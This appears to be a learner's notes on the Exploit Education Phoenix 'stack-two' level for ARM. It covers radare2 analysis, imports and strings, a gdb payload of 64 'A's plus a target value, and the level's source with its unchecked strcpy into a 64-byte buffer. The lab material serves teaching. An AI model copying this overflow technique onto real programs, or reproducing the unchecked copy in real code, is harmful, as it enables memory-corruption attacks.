# Phoenix Stack2
## Static Analysis
##### Analyse the binary
`r2 -A stack-two`
##### Familiarity
```
[0x000104a8]> i
file     stack-two
format   elf
arch     arm
endian   little
```
##### Imports
```
[0x08048370]> ii
[Imports]
   1 0x0001043c  GLOBAL    FUNC strcpy
   2 0x00010448  GLOBAL    FUNC printf
   3 0x00010454  GLOBAL    FUNC getenv
   5 0x00010460  GLOBAL    FUNC puts
   6 0x0001046c  GLOBAL    FUNC errx
  16 0x00010484  GLOBAL    FUNC exit
```
##### Interesting Strings
```
[0x000104a8]> fs strings;f
0x0001068c 74 str.Welcome_to_phoenix_stack_two__brought_to_you_by_https:__exploit.education
0x000106d8 17 str.ExploitEducation
0x000106ec 53 str.please_set_the_ExploitEducation_environment_variable
0x00010724 67 str.Well_done__you_have_successfully_set_changeme_to_the_correct_value
0x00010768 58 str.Almost__changeme_is_currently_0x_08x__we_want_0x0d0a090a
```
##### Overflow
```
0x00010630      81ffffeb       bl sym.imp.strcpy           ; char *strcpy(char *dest, const char *src)
0x00010634      0c301be5       ldr r3, [local_ch]          ; 0xc ; 12
0x00010638      34209fe5       ldr r2, [0x00010674]        ; [0x10674:4]=0xd0a090a
```
##### Run code
```
user@phoenix-arm64:/opt/phoenix/arm$ ./stack-two
stack-two: please set the ExploitEducation environment variable

user@phoenix-arm64:/opt/phoenix/arm$ ./stack-two AAA
stack-two: please set the ExploitEducation environment variable
```
##### Debugger
```
// blind shot. Try the earlier overflow..
(gdb) set args "`perl -e 'print "A"x64 . "\x0a\x09\x0a\x0d";'`"
```
##### Understand getenv
At the moment, the code is setup to fail.
```
int main(void)
{
    char *name = NULL;
    printf("name : %p\n", name);
    name = getenv("HOME");
    printf("name : %p\n", name);
    printf("name : %s\n", name);
    return 0;
}

name : 0x0
name : 0x7ffeefbff8d2
name : /Users/foobar
Program ended with exit code: 0
```










##### Source code
```
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```
